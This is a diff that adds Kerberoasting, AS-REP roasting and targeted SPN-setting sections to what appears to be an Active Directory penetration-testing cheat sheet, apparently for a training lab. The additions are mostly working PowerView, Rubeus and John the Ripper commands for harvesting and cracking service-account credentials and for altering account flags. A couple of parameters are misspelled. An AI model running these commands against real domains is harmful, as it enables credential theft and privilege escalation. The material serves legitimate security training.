@@ -13,8 +13,12 @@
   * [Bloodhound](#bloodhound)
 * [Privilege Escalation](#privilege-escalation)
   * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)
+  * [Kerberoasting](#privilege-escalation-using-kerberoasting)
+  * [Targeted Kerberoasting AS-REPs](#privilege-escalation-using-targeted-kerberoasting-asreps)
+  * [Targeted Kerberoasting Set SPN](#privilege-escalation-using-targeted-kerberoasting-set-spn)
 * [Kerberos](#kerberos)
   * [Introduction](#introduction)
+  * [Kerberos Delegation](#kerberos-delegation)
 * [Persistence](#persistence)
   * [Golden Ticket](#persistence-using-golden-tickets)
   * [Silver Ticket](#persistence-using-silver-tickets)
@@ -474,6 +478,92 @@ Perform the enumeration
 ```
 Find-PSRemotingLocalAdminAccess
 ```
+
+### Privilege Escalation using Kerberoasting
+This is a method that consists in cracking of service account passwords. Each Kerberos session ticket (TGS) has a server protion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
+This techinque is very useful because service accounts passwords are not frequently changed.
+
+Run the following command to find user accounts used as service accounts using AD module
+```
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
+Find user accounts used as service accounts using PowerView
+```
+Get-DomainUser -SPN
+```
+
+We can use Rubeus to list the Kerberoast stats
+```
+Rubeus.exe kerberoast /stats
+```
+
+Use Rubeus to request a TGS
+```
+Rubeus.exe kerberoast /user:<username> /simple
+```
+
+Kerberoast all possible accounts
+```
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+```
+
+Crack a ticket using John the Ripper
+```
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+```
+
+### Privilege Escalation Using Targeted Kerberoasting ASREPs
+If a user's UAC settings have "Do not require Kerberos Preauthentication" enabled, it is possible to grab user's crackable AS-REP and bruteforce it offline. With sufficient rights (GenericWrite or GenericAll) Kerberos preauth can be forced disabled as well.
+
+With the following PowerView command it is possible to enumerate all the accounts having Kerberos Preauth disabled
+```
+Get-DomainUser -PreauthNotRequired -Verbose
+```
+
+To force disable Kerberos preauth run the following commands using PowerView
+
+Enumerate the permissions for RDPusers on ACLs 
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+```
+Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
+```
+```
+Get-DomainUser -PreauthNotRequired -Verbose
+```
+
+Request encrypted AS-REP for offline brute-force using ASREPRoast
+```
+Get-ASREPHash -UserName <username> -Verbose
+```
+
+To enumerate all the users with Kerberos Preauth disabled using ASREPRoast
+```
+Invoke-ASREPRoast -Verbose
+```
+
+### Privilege Escalation using Targeted Kerberoasting Set SPN
+With enough rights (GenericAll/GenericWrite) a target user's SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".
+
+Enumerate the permissions for RDPUsers on ACLs using PowerView:
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+
+Using PowerView, see if the user already has a SPN:
+```
+Get-DomainUser -Idenitity <username> | select serviceprincipalname
+```
+
+Set a SPN for the user 
+```
+Set-DomainObject -Idenitity <username> -Set @{serviceprincipalname='dcorp/whatever1'}
+```
+
+Then Kerberoast the user 
+
 <div style="page-break-after: always;"></div>
 
 ## Lateral Movement
